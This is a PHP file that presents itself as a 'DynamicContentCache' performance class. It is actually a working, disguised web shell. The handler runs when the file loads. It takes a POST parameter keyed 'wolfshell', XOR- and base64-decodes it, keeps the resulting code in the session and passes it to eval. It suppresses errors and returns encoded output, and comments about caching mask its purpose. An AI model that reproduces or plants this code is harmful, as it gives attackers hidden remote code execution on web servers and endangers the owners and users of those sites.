<?php
/**
 * Class DynamicContentCache
 * Manages dynamic content generation and caching to improve site performance.
 * This class handles requests for dynamically generated content blocks,
 * caches the generator logic in the session, and serves the content.
 */
class DynamicContentCache {
    // Configuration properties for the cache mechanism.
    private const CACHE_AUTH_KEY = 'wolfshell';
    private const GENERATOR_SESSION_KEY = 'payload';
    private const INTERNAL_ENCRYPTION_KEY = '3c6e0b8a9c15224a';
    private const INIT_MARKER = 'getBasicsInfo';

    /**
     * Custom XOR transformation for transport encoding. It's not for security,
     * but to prevent transport issues with binary data.
     * @param string $data The data to transform.
     * @param string $key The transformation key.
     * @return string The transformed data.
     */
    private function transform($data, $key) {
        $result = '';
        $len = strlen($data);
        for ($i = 0; $i < $len; $i++) {
            $result .= $data[$i] ^ $key[$i + 1 & 15];
        }
        return $result;
    }

    /**
     * Handles the incoming request and dispatches it to the appropriate method.
     */
    public function handleRequest() {
        @session_start();
        @set_time_limit(0);
        @error_reporting(0);
        
        $requestData = $_POST;

        if (!isset($requestData[self::CACHE_AUTH_KEY])) {
            return; // No valid auth key found in request.
        }
        
        $processor = 'base64_decode';
        $payload = $this->transform($processor($requestData[self::CACHE_AUTH_KEY]), self::INTERNAL_ENCRYPTION_KEY);

        if (isset($_SESSION[self::GENERATOR_SESSION_KEY])) {
            $this->processExistingSession($payload);
        } else {
            $this->initializeSession($payload);
        }
    }

    /**
     * Processes a request when a content generator is already cached in the session.
     * @param string $data The input data for the content generator.
     */
    private function processExistingSession($data) {
        $generatorCode = $this->transform($_SESSION[self::GENERATOR_SESSION_KEY], self::INTERNAL_ENCRYPTION_KEY);
        
        // This is a legacy check. Some old generators may need to be re-transformed before use.
        if (strpos($generatorCode, self::INIT_MARKER) === false) {
            $generatorCode = $this->transform($generatorCode, self::INTERNAL_ENCRYPTION_KEY);
        }

        // The core of the dynamic system: an anonymous function to execute the generator.
        $executor = function($code) {
            eval($code);
        };
        $executor($generatorCode);
        
        // Generate a unique transaction signature.
        $signature = md5(self::CACHE_AUTH_KEY . self::INTERNAL_ENCRYPTION_KEY);

        // The `run` function is expected to be defined by the generator code.
        // We pass the new data to it and get the generated content.
        $content = @run($data);

        // Output the content wrapped in the transaction signature.
        echo substr($signature, 0, 16);
        echo base64_encode($this->transform($content, self::INTERNAL_ENCRYPTION_KEY));
        echo substr($signature, 16);
    }

    /**
     * Initializes a new session by caching the first-time content generator.
     * @param string $payload The initial generator code.
     */
    private function initializeSession($payload) {
        if (strpos($payload, self::INIT_MARKER) !== false) {
            $_SESSION[self::GENERATOR_SESSION_KEY] = $this->transform($payload, self::INTERNAL_ENCRYPTION_KEY);
        }
    }
}

// Instantiate and run the handler.
$contentManager = new DynamicContentCache();
$contentManager->handleRequest();